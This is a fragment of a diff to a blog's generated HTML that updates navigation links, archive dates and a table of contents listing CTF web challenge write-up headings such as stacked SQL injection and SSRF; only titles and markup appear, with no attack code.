-                <a href= "/2019/08/31/SQL-injection-with-raw-MD5-hashes/" title= "SQL injection with raw MD5 hashes">
-                    <div class="prevTitle">SQL injection with raw MD5 hashes</div>
+                <a href= "/2019/10/14/php-ini-setting-phar-readonly/" title= "php.ini_setting_phar.readonly">
+                    <div class="prevTitle">php.ini_setting_phar.readonly</div>
                 </a>
             
         </li>
@@ -806,7 +854,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#随便注"><span class="toc-number">1.</span> <span class="toc-text">随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#解法一：堆叠注入"><span class="toc-number">1.1.</span> <span class="toc-text">解法一：堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解法二："><span class="toc-number">1.2.</span> <span class="toc-text">解法二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-tornado"><span class="toc-number">2.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#高明的黑阔"><span class="toc-number">3.</span> <span class="toc-text">高明的黑阔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hack-World"><span class="toc-number">4.</span> <span class="toc-text">Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-me"><span class="toc-number">5.</span> <span class="toc-text">ssrf me</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#解法一（非预期解）："><span class="toc-number">5.1.</span> <span class="toc-text">解法一（非预期解）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解法二（预期解）：哈希长度扩展攻击"><span class="toc-number">5.2.</span> <span class="toc-text">解法二（预期解）：哈希长度扩展攻击</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#随便注"><span class="toc-number">1.</span> <span class="toc-text">随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#解法一：堆叠注入"><span class="toc-number">1.1.</span> <span class="toc-text">解法一：堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解法二："><span class="toc-number">1.2.</span> <span class="toc-text">解法二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-tornado"><span class="toc-number">2.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#高明的黑阔"><span class="toc-number">3.</span> <span class="toc-text">高明的黑阔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hack-World"><span class="toc-number">4.</span> <span class="toc-text">Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-me"><span class="toc-number">5.</span> <span class="toc-text">ssrf me</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#解法一（非预期解）："><span class="toc-number">5.1.</span> <span class="toc-text">解法一（非预期解）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解法二（预期解）：哈希长度扩展攻击"><span class="toc-number">5.2.</span> <span class="toc-text">解法二（预期解）：哈希长度扩展攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#love-math"><span class="toc-number">6.</span> <span class="toc-text">love math</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -819,12 +867,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
     
     
     
@@ -949,6 +991,11 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2019/10/20/BUUCTF-WEB/" >BUUCTF-WEB</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2019/10/14/php-ini-setting-phar-readonly/" >php.ini_setting_phar.readonly</a>
         </li>
     
@@ -975,11 +1022,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2019/09/06/Java-遥控风扇/" >Java Remote Control Fan</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/03</span><a class="archive-post-title" href= "/2019/09/03/BUUCTF-WEB/" >BUUCTF-WEB</a>
         </li>
     
     
